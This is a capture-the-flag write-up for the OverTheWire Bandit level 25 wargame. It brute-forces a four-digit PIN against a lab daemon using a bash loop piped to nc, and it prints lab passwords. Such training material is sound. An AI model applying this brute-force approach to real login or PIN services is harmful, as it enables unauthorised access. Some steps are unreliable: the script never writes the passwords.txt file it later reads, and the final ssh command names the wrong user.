# Level 25
> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

```shell
bandit24@bandit:~$ cd $(mktemp -d)
bandit24@bandit:/tmp/tmp.OVOzKt6biG$ vi test.sh
```

### test.sh
```shell
#!/bin/bash
password='gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'
for i in {0000..9999}; do
	echo $password $i
done
```

```shell
bandit24@bandit:/tmp/tmp.OVOzKt6biG$ chmod +x test.sh
bandit24@bandit:/tmp/tmp.OVOzKt6biG$ ./test.sh
bandit24@bandit:/tmp/tmp.OVOzKt6biG$ head -n 5 passwords.txt 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0003
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0004

bandit24@bandit:/tmp/tmp.OVOzKt6biG$ cat passwords.txt | nc localhost 30002 > results.txt

bandit24@bandit:/tmp/tmp.OVOzKt6biG$ cat results.txt | grep -vi wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

bandit24@bandit:/tmp/tmp.OVOzKt6biG$ exit

$ ssh bandit24@bandit.labs.overthewire.org -p 2220
$ iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
